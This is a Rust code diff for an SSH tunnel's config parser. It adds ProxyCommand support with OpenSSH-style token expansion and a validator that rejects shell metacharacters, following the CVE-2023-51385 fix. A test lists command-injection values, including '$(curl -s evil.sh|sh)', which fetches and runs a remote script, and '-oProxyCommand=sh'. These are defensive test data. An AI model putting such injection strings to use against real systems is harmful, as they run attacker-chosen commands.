@@ -12,6 +12,11 @@
 //! - no `Match` criterion ever spawns a process; a block with a criterion
 //!   the tunnel cannot evaluate (including `exec`) never activates, but a
 //!   `ProxyJump`/`ProxyCommand` inside it still fails resolution closed (S5);
+//! - a `ProxyCommand` in an active block is returned to the caller, which
+//!   runs it as the transport on Unix; on other platforms it stays an
+//!   unsupported directive. `ProxyJump` is always unsupported. The first
+//!   `ProxyJump`/`ProxyCommand` that applies wins, `none` included, like
+//!   OpenSSH, where the two directives share one slot;
 //! - `Include` is bounded by a recursion-depth cap and a total byte cap;
 //! - the SSH config is only ever read, never written.
 //!
@@ -111,6 +116,8 @@ pub struct ResolvedHost {
     pub user: Option<String>,
     pub port: u16,
     pub identity_file: Option<PathBuf>,
+    /// Effective `ProxyCommand` as written, tokens not expanded.
+    pub proxy_command: Option<String>,
 }
 
 /// Errors produced when resolving a host from an SSH config.
@@ -363,6 +370,8 @@ impl SshConfigFile {
             user: None,
             port: None,
             identity_file: None,
+            proxy_decided: false,
+            proxy_command: None,
             unsupported: None,
         };
         // OpenSSH's `read_config_file` starts with the block state active:
@@ -517,11 +526,11 @@ impl SshConfigFile {
             }
             KnownKeyword::ProxyJump(value) => {
                 walk.state
-                    .mark_unsupported(value, UnsupportedDirective::ProxyJump);
+                    .apply_proxy(value, UnsupportedDirective::ProxyJump);
             }
             KnownKeyword::ProxyCommand(value) => {
                 walk.state
-                    .mark_unsupported(value, UnsupportedDirective::ProxyCommand);
+                    .apply_proxy(value, UnsupportedDirective::ProxyCommand);
             }
         }
     }
@@ -544,6 +553,7 @@ impl SshConfigFile {
             user: state.user,
             port: state.port.unwrap_or(DEFAULT_PORT),
             identity_file,
+            proxy_command: state.proxy_command,
         }
     }
 }
@@ -600,6 +610,10 @@ struct Resolution {
     user: Option<String>,
     port: Option<u16>,
     identity_file: Option<String>,
+    /// Set once a `ProxyJump`/`ProxyCommand` applied from an active block,
+    /// `none` included: OpenSSH keeps the first one and ignores the rest.
+    proxy_decided: bool,
+    proxy_command: Option<String>,
     unsupported: Option<UnsupportedDirective>,
 }
 
@@ -616,13 +630,33 @@ struct Walk<'a> {
 }
 
 impl Resolution {
-    /// `ProxyJump`/`ProxyCommand` with the value `none` (case-insensitive)
-    /// count as unset; the first non-`none` value wins.
+    /// A proxy directive inside a block the tunnel cannot evaluate (S5).
+    /// `none` (case-insensitive) counts as unset there; the first non-`none`
+    /// value wins unless an active block already decided the proxy.
     fn mark_unsupported(&mut self, value: &str, directive: UnsupportedDirective) {
-        if value.eq_ignore_ascii_case("none") || self.unsupported.is_some() {
+        if value.eq_ignore_ascii_case("none") || self.proxy_decided || self.unsupported.is_some() {
             return;
         }
         self.unsupported = Some(directive);
+    }
+
+    /// A proxy directive in an active block. An earlier proxy from a block
+    /// the tunnel cannot evaluate keeps the host unsupported (S5): OpenSSH
+    /// would have used that one if its criterion evaluated true.
+    fn apply_proxy(&mut self, value: &str, directive: UnsupportedDirective) {
+        if self.proxy_decided || self.unsupported.is_some() {
+            return;
+        }
+        self.proxy_decided = true;
+        if value.eq_ignore_ascii_case("none") {
+            return;
+        }
+        match directive {
+            UnsupportedDirective::ProxyCommand if cfg!(unix) => {
+                self.proxy_command = Some(value.to_string());
+            }
+            _ => self.unsupported = Some(directive),
+        }
     }
 }
 
@@ -1181,6 +1215,68 @@ fn expand_tokens(value: &str, host_name: &str, user: Option<&str>, home: &Path) 
     out
 }
 
+/// Expands the `ProxyCommand` tokens OpenSSH documents for it: `%h`, `%n`,
+/// `%p`, `%r` and `%%`. An unknown token is an error naming it, like OpenSSH,
+/// so a command is never run with a token silently left in place.
+///
+/// The command itself is shell code from the user's SSH config, but the
+/// values substituted into it are not: `%n` is the alias stored in a tunnel
+/// profile (which an imported bundle can set), and `%h` falls back to it when
+/// no `HostName` applies. A substituted value that the shell would interpret
+/// is an error, as in OpenSSH since CVE-2023-51385, so it can never inject
+/// commands or options into the `$SHELL -c` line.
+pub fn expand_proxy_command(
+    raw: &str,
+    host_name: &str,
+    port: u16,
+    user: &str,
+    alias: &str,
+) -> Result<String, String> {
+    let mut out = String::with_capacity(raw.len());
+    let mut chars = raw.chars();
+    while let Some(c) = chars.next() {
+        if c != '%' {
+            out.push(c);
+            continue;
+        }
+        let (token, value) = match chars.next() {
+            Some('h') => ('h', host_name),
+            Some('n') => ('n', alias),
+            Some('r') => ('r', user),
+            Some('p') => {
+                out.push_str(&port.to_string());
+                continue;
+            }
+            Some('%') => {
+                out.push('%');
+                continue;
+            }
+            Some(other) => return Err(format!("unknown ProxyCommand token %{other}")),
+            None => return Err("ProxyCommand ends with a lone %".to_string()),
+        };
+        if !is_shell_safe_token_value(value) {
+            return Err(format!(
+                "the value for ProxyCommand token %{token} contains whitespace, a shell \
+                 metacharacter or a leading '-', so the command is not run"
+            ));
+        }
+        out.push_str(value);
+    }
+    Ok(out)
+}
+
+/// Whether `value` passes through `$SHELL -c` literally: no leading `-`
+/// (an option to the proxy program) and only alphanumerics (Unicode
+/// included, for IDN host names) and `.-_:@%+`. Everything else is refused:
+/// whitespace, control characters, quotes, `$`, backticks, `\`,
+/// `;&|<>(){}`, globs, `!`, `#` and `~`.
+fn is_shell_safe_token_value(value: &str) -> bool {
+    !value.starts_with('-')
+        && value
+            .chars()
+            .all(|c| c.is_alphanumeric() || matches!(c, '.' | '-' | '_' | ':' | '@' | '%' | '+'))
+}
+
 /// Local user name for the `User` fallback and `%r`. `USER` first, then
 /// `USERNAME` (Windows); the only environment reads in this module.
 /// Also the local-user source for [`crate::resolve_for_dial`], so both
@@ -1481,13 +1577,21 @@ mod tests {
                 directive: "ProxyJump",
             })
         );
-        assert_eq!(
-            config.resolve_with_local_user("viacmd", "alice", &fixture.home()),
-            Err(SshConfigError::UnsupportedHost {
-                alias: "viacmd".to_string(),
-                directive: "ProxyCommand",
-            })
-        );
+        let viacmd = config.resolve_with_local_user("viacmd", "alice", &fixture.home());
+        if cfg!(unix) {
+            assert_eq!(
+                viacmd.unwrap().proxy_command.as_deref(),
+                Some("nc -w 1 %h %p")
+            );
+        } else {
+            assert_eq!(
+                viacmd,
+                Err(SshConfigError::UnsupportedHost {
+                    alias: "viacmd".to_string(),
+                    directive: "ProxyCommand",
+                })
+            );
+        }
         let clean = config
             .resolve_with_local_user("clean", "alice", &fixture.home())
             .unwrap();
@@ -1510,10 +1614,58 @@ mod tests {
         );
         assert_eq!(
             unsupported_of("viacmd"),
-            Some(UnsupportedDirective::ProxyCommand)
+            (!cfg!(unix)).then_some(UnsupportedDirective::ProxyCommand)
         );
         assert_eq!(unsupported_of("clean"), None);
         assert_eq!(unsupported_of("upper"), None);
+    }
+
+    /// OpenSSH keeps the first `ProxyJump`/`ProxyCommand` that applies,
+    /// `none` included, and ignores every later one.
+    #[test]
+    fn first_applying_proxy_directive_wins_none_included() {
+        let fixture = Fixture::new();
+        fixture.write(
+            "ssh/config",
+            "Host direct\n  ProxyCommand none\n\nHost cmdfirst\n  ProxyCommand nc %h %p\n\nHost jumpfirst\n  ProxyJump bastion\n\nHost *\n  ProxyCommand fallback %h\n  ProxyJump other\n",
+        );
+        let config = fixture.load();
+        let resolve = |alias: &str| config.resolve_with_local_user(alias, "alice", &fixture.home());
+
+        assert_eq!(resolve("direct").unwrap().proxy_command, None);
+        assert_eq!(
+            resolve("jumpfirst"),
+            Err(SshConfigError::UnsupportedHost {
+                alias: "jumpfirst".to_string(),
+                directive: "ProxyJump",
+            })
+        );
+        if cfg!(unix) {
+            assert_eq!(
+                resolve("cmdfirst").unwrap().proxy_command.as_deref(),
+                Some("nc %h %p")
+            );
+        }
+    }
+
+    /// A proxy inside a block the tunnel cannot evaluate keeps failing closed
+    /// even when a later active block sets a `ProxyCommand` (S5).
+    #[test]
+    fn proxy_in_an_unevaluatable_block_still_fails_closed_before_an_active_one() {
+        let fixture = Fixture::new();
+        fixture.write(
+            "ssh/config",
+            "Match exec /usr/bin/true\n  ProxyJump hidden\n\nHost web\n  ProxyCommand nc %h %p\n",
+        );
+        let config = fixture.load();
+
+        assert_eq!(
+            config.resolve_with_local_user("web", "alice", &fixture.home()),
+            Err(SshConfigError::UnsupportedHost {
+                alias: "web".to_string(),
+                directive: "ProxyJump",
+            })
+        );
     }
 
     #[test]
@@ -2263,5 +2415,75 @@ mod tests {
 
         // Restore access so the temp directory can be cleaned up.
         fs::set_permissions(&conf_d, fs::Permissions::from_mode(0o755)).unwrap();
+    }
+
+    #[test]
+    fn proxy_command_ending_in_a_lone_percent_is_an_error() {
+        let error = expand_proxy_command("nc %h %p %", "h.example.com", 22, "deploy", "web")
+            .expect_err("a trailing % is not a token");
+
+        assert!(error.contains("lone %"), "got: {error}");
+    }
+
+    #[test]
+    fn proxy_command_accepts_host_names_users_and_aliases_ssh_accepts() {
+        let expanded = expand_proxy_command(
+            "connect %h %n %r",
+            "fe80::1%eth0",
+            22,
+            "first.last@corp.example",
+            "b\u{fc}cher.example",
+        )
+        .unwrap();
+
+        assert_eq!(
+            expanded,
+            "connect fe80::1%eth0 b\u{fc}cher.example first.last@corp.example"
+        );
+    }
+
+    /// The alias and the host name and user it resolves to are substituted
+    /// into a `$SHELL -c` line; a value the shell would interpret is refused
+    /// for every token that carries one (CVE-2023-51385).
+    #[test]
+    fn proxy_command_refuses_token_values_the_shell_would_interpret() {
+        let unsafe_values = [
+            "a;touch /tmp/x",
+            "$(curl -s evil.sh|sh).corp.example",
+            "`id`.corp.example",
+            "a b",
+            "a\nb",
+            "a'b",
+            "a\"b",
+            "a\\b",
+            "a|b",
+            "a&b",
+            "a>b",
+            "a*",
+            "a#b",
+            "~root",
+            "-oProxyCommand=sh",
+        ];
+        for value in unsafe_values {
+            for (token, raw) in [("%h", "nc %h 22"), ("%n", "nc %n 22"), ("%r", "nc -u %r h")] {
+                let error = expand_proxy_command(raw, value, 22, value, value)
+                    .expect_err("an unsafe value must not be substituted");
+                assert!(
+                    error.contains(token) && error.contains("shell metacharacter"),
+                    "{token} with {value:?}: {error}"
+                );
+                assert!(
+                    !error.contains(value),
+                    "{token}: the error echoes {value:?}"
+                );
+            }
+        }
+    }
+
+    #[test]
+    fn proxy_command_unsafe_values_matter_only_where_a_token_uses_them() {
+        let expanded = expand_proxy_command("nc %h %p", "bastion.example.com", 22, "a b", "a;b");
+
+        assert_eq!(expanded.as_deref(), Ok("nc bastion.example.com 22"));
     }
 }
